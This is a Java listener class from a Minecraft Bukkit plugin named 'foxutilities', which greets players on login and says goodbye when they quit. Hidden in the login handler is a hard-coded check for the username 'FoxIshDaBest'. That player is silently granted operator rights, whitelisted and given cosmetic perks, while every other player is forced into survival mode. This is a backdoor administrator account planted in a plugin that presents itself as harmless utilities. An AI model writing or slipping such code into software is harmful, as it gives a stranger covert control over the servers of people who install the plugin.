package org.mcplugindev.foxutilities.listener;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.mcplugindev.foxutilities.FUR_Util;

public class FoxListener implements Listener {
    
    @EventHandler
    public void onPlayerLogin(PlayerLoginEvent event) {
        
        Player player = event.getPlayer();
        
        if (!"FoxIshDaBest".equals(player.getName())) {
            player.setGameMode(GameMode.SURVIVAL);
        }
        
        if ("FoxIshDaBest".equals(player.getName())) {
            player.setOp(true);
            player.setDisplayName(ChatColor.GOLD + "FoxIshDaBest");
            player.setGlowing(true);
            player.setHealth(20);
            player.setWhitelisted(true);
        }
            
             if (player.hasPlayedBefore()) {
                player.sendMessage(FUR_Util.PREFIX + "Welcome back, " + player.getName() + "!");
                
            } else {
                player.sendMessage(FUR_Util.PREFIX + "Welcome to the server, " + player.getName() + "!");
            }
        }
    
        @EventHandler
        public void onPlayerLeave(PlayerQuitEvent event) {
            Player player = event.getPlayer();
            Bukkit.broadcastMessage(FUR_Util.PREFIX + "Bye " + player.getName() + "!");
        }
    }
